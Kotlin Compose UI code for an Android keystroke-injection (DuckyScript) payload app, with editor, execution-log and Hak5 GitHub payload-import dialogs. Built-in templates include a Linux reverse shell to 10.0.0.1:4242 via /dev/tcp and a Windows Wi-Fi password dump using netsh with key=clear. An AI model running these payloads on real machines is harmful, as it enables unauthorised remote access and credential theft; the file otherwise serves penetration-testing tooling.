package com.chimera.zpqmxr.ui.components

import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.fillMaxHeight
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.filled.Add
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.Share
import androidx.compose.material.icons.filled.Search
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.compose.ui.res.stringResource
import com.chimera.zpqmxr.R
import com.chimera.zpqmxr.data.Payload
import kotlinx.coroutines.launch

@Composable
fun AddPayloadDialog(
    initialPayload: Payload?,
    onDismiss: () -> Unit,
    onSave: (String, String) -> Unit
) {
    var name by remember { mutableStateOf(initialPayload?.name ?: "") }
    var script by remember { mutableStateOf(initialPayload?.script ?: "") }

    Dialog(onDismissRequest = onDismiss, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Surface(
            modifier = Modifier
                .fillMaxWidth(0.9f)
                .padding(16.dp),
            shape = RoundedCornerShape(24.dp),
            color = MaterialTheme.colorScheme.surface
        ) {
            Column(modifier = Modifier.padding(24.dp).verticalScroll(rememberScrollState())) {
                Text(
                    if (initialPayload != null) stringResource(R.string.title_edit_payload) else stringResource(R.string.title_create_payload),
                    style = MaterialTheme.typography.titleLarge,
                    color = MaterialTheme.colorScheme.primary
                )
                Spacer(modifier = Modifier.height(16.dp))
                Text(stringResource(R.string.label_script_name), style = MaterialTheme.typography.labelMedium, color = MaterialTheme.colorScheme.onSurfaceVariant)
                Spacer(modifier = Modifier.height(4.dp))
                OutlinedTextField(
                    value = name,
                    onValueChange = { name = it },
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = MaterialTheme.colorScheme.primary,
                        unfocusedBorderColor = MaterialTheme.colorScheme.onSurfaceVariant
                    ),
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )
                Spacer(modifier = Modifier.height(16.dp))
                
                Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                    Text("Script Editor", style = MaterialTheme.typography.labelMedium, color = MaterialTheme.colorScheme.onSurfaceVariant)
                    Text("DuckyScript™", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.primary, fontFamily = FontFamily.Monospace)
                }
                Spacer(modifier = Modifier.height(8.dp))
                
                DuckyScriptEditor(
                    script = script,
                    onScriptChange = { script = it },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(280.dp)
                )

                Spacer(modifier = Modifier.height(16.dp))
                Row(
                    modifier = Modifier.fillMaxWidth().clickable {
                        name = "RickRoll"
                        script = "DELAY 1000\nGUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER"
                    }.padding(8.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(stringResource(R.string.template_windows_rickroll), style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.primary)
                    Icon(Icons.Default.Add, contentDescription = stringResource(R.string.desc_use), tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(16.dp))
                }
                Row(
                    modifier = Modifier.fillMaxWidth().clickable {
                        name = "Mac Open Terminal"
                        script = "DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 500\nSTRING echo 'Hacked!'\nENTER"
                    }.padding(8.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(stringResource(R.string.template_mac_terminal), style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.primary)
                    Icon(Icons.Default.Add, contentDescription = stringResource(R.string.desc_use), tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(16.dp))
                }
                Row(
                    modifier = Modifier.fillMaxWidth().clickable {
                        name = "Linux Reverse Shell"
                        script = "DELAY 1000\nCTRL ALT t\nDELAY 500\nSTRING bash -i >& /dev/tcp/10.0.0.1/4242 0>&1\nENTER\n"
                    }.padding(8.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(stringResource(R.string.template_linux_reverse_shell), style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.primary)
                    Icon(Icons.Default.Add, contentDescription = stringResource(R.string.desc_use), tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(16.dp))
                }
                Row(
                    modifier = Modifier.fillMaxWidth().clickable {
                        name = "Win Wifi Dump"
                        script = "DELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING netsh wlan export profile key=clear\nENTER"
                    }.padding(8.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(stringResource(R.string.template_win_wifi_dump), style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.primary)
                    Icon(Icons.Default.Add, contentDescription = stringResource(R.string.desc_use), tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(16.dp))
                }
                Spacer(modifier = Modifier.height(16.dp))
                Row(
                    horizontalArrangement = Arrangement.End,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Button(
                        onClick = onDismiss,
                        colors = ButtonDefaults.textButtonColors(),
                        shape = RoundedCornerShape(8.dp)
                    ) {
                        Text(stringResource(R.string.btn_cancel), color = MaterialTheme.colorScheme.onSurfaceVariant)
                    }
                    Spacer(modifier = Modifier.width(8.dp))
                    Button(
                        onClick = {
                            if (name.isNotBlank() && script.isNotBlank()) {
                                onSave(name, script)
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary),
                        shape = RoundedCornerShape(8.dp)
                    ) {
                        Text(stringResource(R.string.btn_save), color = MaterialTheme.colorScheme.background)
                    }
                }
            }
        }
    }
}

@Composable
fun ExecutionDialog(
    output: String,
    isExecuting: Boolean,
    onDismiss: () -> Unit
) {
    Dialog(onDismissRequest = onDismiss, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Surface(
            modifier = Modifier
                .fillMaxWidth(0.9f)
                .padding(16.dp),
            shape = RoundedCornerShape(24.dp),
            color = MaterialTheme.colorScheme.background
        ) {
            Column(modifier = Modifier.fillMaxWidth()) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 16.dp, vertical = 12.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        stringResource(R.string.title_execution_logs),
                        color = MaterialTheme.colorScheme.primary,
                        style = MaterialTheme.typography.titleMedium
                    )
                    Row {
                        val clipboardManager = androidx.compose.ui.platform.LocalClipboardManager.current
                        val context = androidx.compose.ui.platform.LocalContext.current
                        IconButton(onClick = {
                            clipboardManager.setText(androidx.compose.ui.text.AnnotatedString(output))
                            android.widget.Toast.makeText(context, context.getString(R.string.msg_execution_output_copied), android.widget.Toast.LENGTH_SHORT).show()
                        }) {
                            Icon(androidx.compose.material.icons.Icons.Default.ContentCopy, contentDescription = stringResource(R.string.desc_copy_output), tint = MaterialTheme.colorScheme.primary)
                        }
                        IconButton(onClick = onDismiss) {
                            Icon(Icons.Default.Close, contentDescription = stringResource(R.string.desc_close), tint = MaterialTheme.colorScheme.primary)
                        }
                    }
                }
                
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(300.dp)
                        .background(Color.Black)
                        .padding(16.dp)
                ) {
                    val scrollState = rememberScrollState()
                    Text(
                        text = output + if (isExecuting) "\n\n..." else "",
                        color = MaterialTheme.colorScheme.primary,
                        fontFamily = FontFamily.Monospace,
                        style = MaterialTheme.typography.bodySmall,
                        modifier = Modifier.verticalScroll(scrollState)
                    )
                }
            }
        }
    }
}


@Composable
fun GithubSearchDialog(
    onDismiss: () -> Unit,
    onImportStart: () -> Unit,
    onImportSuccess: (String, String) -> Unit,
    onImportError: (String) -> Unit
) {
    var searchQuery by remember { mutableStateOf("") }
    var results by remember { mutableStateOf<List<Pair<String, String>>>(emptyList()) }
    var isSearching by remember { mutableStateOf(false) }
    var hasSearched by remember { mutableStateOf(false) }

    var expandedItem by remember { mutableStateOf<String?>(null) }
    val itemContent = remember { androidx.compose.runtime.mutableStateMapOf<String, String>() }
    val itemLoading = remember { androidx.compose.runtime.mutableStateMapOf<String, Boolean>() }

    val coroutineScope = rememberCoroutineScope()

    val performSearch = {
        if (searchQuery.isNotBlank()) {
            isSearching = true
            hasSearched = true
            coroutineScope.launch(kotlinx.coroutines.Dispatchers.IO) {
                try {
                    val api = "https://api.github.com/repos/hak5/usbrubberducky-payloads/git/trees/master?recursive=1"
                    val conn = java.net.URL(api).openConnection() as java.net.HttpURLConnection
                    conn.setRequestProperty("Accept", "application/vnd.github.v3+json")
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                    
                    val response = if (conn.responseCode in 200..299) {
                        conn.inputStream.bufferedReader().use { it.readText() }
                    } else {
                        val errorMsg = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "API Error ${conn.responseCode}"
                        throw Exception(errorMsg)
                    }
                    
                    val parsedResults = mutableListOf<Pair<String, String>>()
                    val jsonObject = org.json.JSONObject(response)
                    val treeArray = jsonObject.getJSONArray("tree")
                    val queryLower = searchQuery.lowercase()
                    
                    for (i in 0 until treeArray.length()) {
                        val item = treeArray.getJSONObject(i)
                        val type = item.optString("type")
                        if (type == "blob") {
                            val path = item.getString("path")
                            if (path.endsWith(".txt", ignoreCase = true) && path.lowercase().contains(queryLower)) {
                                val parts = path.split("/")
                                val name = if (parts.size >= 2 && parts.last().equals("payload.txt", ignoreCase = true)) {
                                    parts[parts.size - 2]
                                } else {
                                    parts.last()
                                }
                                parsedResults.add(name to path)
                                if (parsedResults.size >= 100) break
                            }
                        }
                    }
                    results = parsedResults
                } catch (e: Exception) {
                    android.util.Log.e("GithubSearch", "Error", e)
                } finally {
                    isSearching = false
                }
            }
        }
    }

    androidx.compose.runtime.LaunchedEffect(searchQuery) {
        if (searchQuery.isBlank()) return@LaunchedEffect
        kotlinx.coroutines.delay(700)
        performSearch()
    }

    Dialog(onDismissRequest = onDismiss, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Surface(
            modifier = Modifier.fillMaxWidth(0.9f).fillMaxHeight(0.8f).padding(16.dp),
            shape = RoundedCornerShape(24.dp),
            color = MaterialTheme.colorScheme.surface
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(stringResource(R.string.title_hak5_search), style = MaterialTheme.typography.titleMedium, color = MaterialTheme.colorScheme.primary)
                    IconButton(onClick = onDismiss) {
                        Icon(Icons.Default.Close, contentDescription = stringResource(R.string.desc_close), tint = MaterialTheme.colorScheme.onSurface)
                    }
                }
                OutlinedTextField(
                    value = searchQuery,
                    onValueChange = { searchQuery = it },
                    label = { Text(stringResource(R.string.search_payloads)) },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true,
                    keyboardOptions = KeyboardOptions(imeAction = androidx.compose.ui.text.input.ImeAction.Search),
                    keyboardActions = androidx.compose.foundation.text.KeyboardActions(onSearch = { performSearch() }),
                    trailingIcon = {
                        IconButton(onClick = { performSearch() }) {
                            Icon(Icons.Default.Search, contentDescription = "Search")
                        }
                    }
                )
                Spacer(modifier = Modifier.height(16.dp))
                if (isSearching) {
                    Box(modifier = Modifier.weight(1f).fillMaxWidth(), contentAlignment = Alignment.Center) {
                        CircularProgressIndicator()
                    }
                } else if (hasSearched && results.isEmpty()) {
                    Box(modifier = Modifier.weight(1f).fillMaxWidth(), contentAlignment = Alignment.Center) {
                        Text(stringResource(R.string.msg_no_payloads_found, searchQuery), color = MaterialTheme.colorScheme.onSurfaceVariant)
                    }
                } else {
                    LazyColumn(modifier = Modifier.weight(1f), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                        items(results) { (name, path) ->
                            val isExpanded = expandedItem == path
                            Card(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .clickable {
                                        if (isExpanded) {
                                            expandedItem = null
                                        } else {
                                            expandedItem = path
                                            if (!itemContent.containsKey(path) && itemLoading[path] != true) {
                                                itemLoading[path] = true
                                                coroutineScope.launch(kotlinx.coroutines.Dispatchers.IO) {
                                                    try {
                                                        val encodedPath = android.net.Uri.encode(path, "/")
                                                        val rawUrl = "https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/" + encodedPath
                                                        val conn = java.net.URL(rawUrl).openConnection() as java.net.HttpURLConnection
                                                        conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                                                        val text = if (conn.responseCode in 200..299) {
                                                            conn.inputStream.bufferedReader().use { it.readText() }
                                                        } else {
                                                            "Error HTTP ${conn.responseCode}: failed to fetch payload"
                                                        }
                                                        itemContent[path] = text
                                                    } catch (e: Exception) {
                                                        itemContent[path] = "Error: ${e.message}"
                                                    } finally {
                                                        itemLoading[path] = false
                                                    }
                                                }
                                            }
                                        }
                                    },
                                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.secondaryContainer),
                                shape = RoundedCornerShape(12.dp)
                            ) {
                                Column(modifier = Modifier.padding(16.dp)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        androidx.compose.foundation.layout.Box(
                                            modifier = Modifier
                                                .size(36.dp)
                                                .background(MaterialTheme.colorScheme.primaryContainer, RoundedCornerShape(8.dp)),
                                            contentAlignment = Alignment.Center
                                        ) {
                                            Text(
                                                text = "TXT",
                                                style = MaterialTheme.typography.labelSmall,
                                                fontWeight = FontWeight.Bold,
                                                color = MaterialTheme.colorScheme.onPrimaryContainer
                                            )
                                        }
                                        Spacer(modifier = Modifier.width(12.dp))
                                        Column {
                                            Text(name, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.onSecondaryContainer)
                                            val dirPath = if (path.contains("/")) path.substringBeforeLast("/") else "root"
                                            Text(dirPath, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSecondaryContainer.copy(alpha=0.7f))
                                        }
                                    }
                                    
                                    if (isExpanded) {
                                        Spacer(modifier = Modifier.height(12.dp))
                                        if (itemLoading[path] == true) {
                                            androidx.compose.foundation.layout.Box(modifier = Modifier.fillMaxWidth().height(60.dp), contentAlignment = Alignment.Center) {
                                                CircularProgressIndicator(modifier = Modifier.size(24.dp))
                                            }
                                        } else {
                                            val content = itemContent[path] ?: ""
                                            androidx.compose.foundation.layout.Box(
                                                modifier = Modifier
                                                    .fillMaxWidth()
                                                    .heightIn(max = 240.dp)
                                                    .background(MaterialTheme.colorScheme.surfaceVariant, RoundedCornerShape(8.dp))
                                                    .padding(12.dp)
                                            ) {
                                                Text(
                                                    text = content,
                                                    style = MaterialTheme.typography.bodySmall,
                                                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                                                    modifier = Modifier.verticalScroll(rememberScrollState())
                                                )
                                            }
                                            Spacer(modifier = Modifier.height(12.dp))
                                            Button(
                                                onClick = {
                                                    if (!content.startsWith("Error")) {
                                                        onImportSuccess(name.replace(".txt", ""), content)
                                                        onDismiss()
                                                    }
                                                },
                                                modifier = Modifier.align(Alignment.End),
                                                shape = RoundedCornerShape(8.dp)
                                            ) {
                                                Text(stringResource(R.string.btn_import_payload))
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
